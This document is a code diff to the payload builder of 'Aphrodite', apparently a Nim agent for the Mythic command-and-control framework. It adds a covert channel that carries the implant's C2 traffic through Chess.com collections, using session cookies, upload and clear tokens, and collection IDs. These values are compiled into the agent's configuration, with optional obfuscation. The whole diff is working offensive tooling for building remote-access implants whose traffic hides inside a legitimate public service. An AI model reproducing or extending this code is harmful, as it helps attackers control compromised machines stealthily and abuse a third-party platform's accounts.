@@ -23,11 +23,11 @@ class AphroditePayloadType(PayloadType):
 Aphrodite - Agent Mythic C2 cross-platform ecrit en Nim.
 Goddess of beauty. Compiles to native binary from Linux.
 Supports Linux (native) and Windows (cross-compiled via mingw-w64).
-Profiles: http, websocket.
+Profiles: http, websocket, chesscom (Chess.com collections — pair with Mythic chesscom C2 profile).
 NOTE: PSK mode — uncheck 'Encrypted Key Exchange' in the C2 profile.
 """
     supports_dynamic_loading = False
-    c2_profiles = ["http", "websocket"]
+    c2_profiles = ["http", "websocket", "chesscom"]
     build_parameters = [
         BuildParameter(
             name="target_os",
@@ -85,7 +85,7 @@ NOTE: PSK mode — uncheck 'Encrypted Key Exchange' in the C2 profile.
         try:
             if not hasattr(self, "c2info") or not self.c2info:
                 build_stderr += "ERROR: No C2 profile selected.\n"
-                build_stderr += "Select the HTTP profile when creating the payload.\n"
+                build_stderr += "Select a C2 profile (http, websocket, or chesscom) when creating the payload.\n"
                 return BuildResponse(
                     status=BuildStatus.Error,
                     build_stdout=build_stdout,
@@ -95,8 +95,10 @@ NOTE: PSK mode — uncheck 'Encrypted Key Exchange' in the C2 profile.
             c2 = self.c2info[0]
             profile = c2.get_c2profile()
             profile_name = profile.get("name", "")
-            if profile_name not in ("http", "websocket"):
-                build_stderr += f"Aphrodite supports http and websocket C2 profiles. Got: {profile_name}\n"
+            if profile_name not in ("http", "websocket", "chesscom"):
+                build_stderr += (
+                    f"Aphrodite supports http, websocket, and chesscom C2 profiles. Got: {profile_name}\n"
+                )
                 return BuildResponse(
                     status=BuildStatus.Error,
                     build_stdout=build_stdout,
@@ -189,6 +191,34 @@ NOTE: PSK mode — uncheck 'Encrypted Key Exchange' in the C2 profile.
             # EKE is supported for Linux; Windows falls back to PSK
             use_eke = not use_psk
 
+            # --- Chess.com (chesscom profile) — uses collections + tokens, not HTTP callback URL ---
+            chess_cookie = ""
+            chess_upload = ""
+            chess_clear = ""
+            chess_agent_coll = ""
+            chess_server_coll = ""
+            chess_skip = ""
+            chess_library_referer = ""
+            chess_wait_ms = 5000
+            chess_jitter_sec = 3
+
+            if profile_name == "chesscom":
+                chess_cookie = str(_extract(params, "chess_com_cookie", "") or "")
+                chess_upload = str(_extract(params, "upload_token", "") or "")
+                chess_clear = str(_extract(params, "clear_token", "") or "")
+                chess_agent_coll = str(_extract(params, "agent_to_server_collection", "") or "")
+                chess_server_coll = str(_extract(params, "server_to_agent_collection", "") or "")
+                chess_skip = str(_extract(params, "skip_item_ids", "") or "")
+                chess_library_referer = str(_extract(params, "library_referer", "") or "")
+                try:
+                    chess_wait_ms = max(2000, min(60000, int(interval) * 500))
+                except Exception:
+                    chess_wait_ms = 5000
+                try:
+                    chess_jitter_sec = max(0, min(15, int(jitter // 3)))
+                except Exception:
+                    chess_jitter_sec = 3
+
             # --- Build base URL (HTTP) ---
             if "://" not in callback_host:
                 callback_host = "http://" + callback_host
@@ -214,6 +244,10 @@ NOTE: PSK mode — uncheck 'Encrypted Key Exchange' in the C2 profile.
             build_stdout += f"[*] Target: {target_os}/{architecture} | debug={debug} | obfuscation={obfuscation}\n"
             if profile_name == "websocket":
                 build_stdout += f"[*] C2 (WS): ws://{ws_host}:{ws_port}/{ws_endpoint} | interval={interval}s jitter={jitter}%\n"
+            elif profile_name == "chesscom":
+                build_stdout += (
+                    f"[*] C2 (Chess.com): agent→server coll configured | interval={interval}s jitter={jitter}%\n"
+                )
             else:
                 build_stdout += f"[*] C2 (HTTP): {base_url}{post_uri} | interval={interval}s jitter={jitter}%\n"
 
@@ -240,6 +274,15 @@ NOTE: PSK mode — uncheck 'Encrypted Key Exchange' in the C2 profile.
                     use_psk=use_psk,
                     debug=debug,
                     obfuscation=obfuscation,
+                    chess_cookie=chess_cookie,
+                    chess_upload=chess_upload,
+                    chess_clear=chess_clear,
+                    chess_agent_coll=chess_agent_coll,
+                    chess_server_coll=chess_server_coll,
+                    chess_skip=chess_skip,
+                    chess_library_referer=chess_library_referer,
+                    chess_wait_ms=chess_wait_ms,
+                    chess_jitter_sec=chess_jitter_sec,
                 )
 
                 config_path = os.path.join(dst_dir, "src", "config.nim")
@@ -290,6 +333,8 @@ NOTE: PSK mode — uncheck 'Encrypted Key Exchange' in the C2 profile.
                 # C2 profile selection
                 if profile_name == "websocket":
                     nim_flags.append("-d:c2ProfileWs")
+                elif profile_name == "chesscom":
+                    nim_flags.append("-d:c2ProfileChesscom")
 
                 # EKE (Linux only — Windows cross-compile lacks OpenSSL)
                 if use_eke:
@@ -505,6 +550,10 @@ NOTE: PSK mode — uncheck 'Encrypted Key Exchange' in the C2 profile.
         ws_host, ws_port, ws_path,
         interval, jitter, killdate, user_agent, aes_psk, use_psk, debug,
         obfuscation="none",
+        chess_cookie="", chess_upload="", chess_clear="",
+        chess_agent_coll="", chess_server_coll="", chess_skip="",
+        chess_library_referer="",
+        chess_wait_ms=5000, chess_jitter_sec=3,
     ) -> str:
         def nim_str(s):
             return s.replace("\\", "\\\\").replace('"', '\\"')
@@ -516,6 +565,18 @@ NOTE: PSK mode — uncheck 'Encrypted Key Exchange' in the C2 profile.
             f"  JitterPercent* = {jitter}\n"
             f"  UsePsk* = {str(use_psk).lower()}\n"
             f"  DebugMode* = {str(debug).lower()}\n"
+            f"  ChessWaitMs* = {chess_wait_ms}\n"
+            f"  ChessJitterSeconds* = {chess_jitter_sec}\n"
+        )
+
+        chess_lines = (
+            f'  ChessCookie* = "{nim_str(chess_cookie)}"\n'
+            f'  ChessUploadToken* = "{nim_str(chess_upload)}"\n'
+            f'  ChessClearToken* = "{nim_str(chess_clear)}"\n'
+            f'  ChessAgentUploadCollection* = "{nim_str(chess_agent_coll)}"\n'
+            f'  ChessServerReplyCollection* = "{nim_str(chess_server_coll)}"\n'
+            f'  ChessSkipItemIds* = "{nim_str(chess_skip)}"\n'
+            f'  ChessLibraryReferer* = "{nim_str(chess_library_referer)}"\n'
         )
 
         if obfuscation == "none":
@@ -530,6 +591,7 @@ NOTE: PSK mode — uncheck 'Encrypted Key Exchange' in the C2 profile.
                 f'  KillDate* = "{nim_str(killdate)}"\n'
                 f'  UserAgent* = "{nim_str(user_agent)}"\n'
                 f'  AesPsk* = "{nim_str(aes_psk)}"\n'
+                + chess_lines
                 + scalars
             )
 
@@ -542,6 +604,13 @@ NOTE: PSK mode — uncheck 'Encrypted Key Exchange' in the C2 profile.
             "KillDate": killdate.encode(),
             "UserAgent": user_agent.encode(),
             "AesPsk": aes_psk.encode(),
+            "ChessCookie": chess_cookie.encode(),
+            "ChessUploadToken": chess_upload.encode(),
+            "ChessClearToken": chess_clear.encode(),
+            "ChessAgentUploadCollection": chess_agent_coll.encode(),
+            "ChessServerReplyCollection": chess_server_coll.encode(),
+            "ChessSkipItemIds": chess_skip.encode(),
+            "ChessLibraryReferer": chess_library_referer.encode(),
         }
 
         lines = ["# config.nim - Auto-generated by Aphrodite builder. DO NOT EDIT MANUALLY."]
